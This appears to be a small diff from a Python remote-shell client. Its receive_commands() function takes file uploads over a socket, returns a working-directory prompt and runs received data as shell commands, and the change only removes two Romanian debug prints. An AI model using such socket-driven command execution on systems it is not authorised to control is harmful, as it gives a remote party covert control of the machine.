@@ -60,11 +60,9 @@ def receive_commands():
                         f.close()
                         s.send(str.encode(os.getcwd() + '> '))
                         receive_file = False
-                        print("La final de upload")
                     else:
                         f.write(data)
                         data = s.recv(1024)
-                print("a iesit din while")
         elif (len(data) > 0) and (data.decode("utf-8") != "null"):
             """In other cases, execute another shell command using a child program in a new process
                     the command must be typed as in a shell prompt
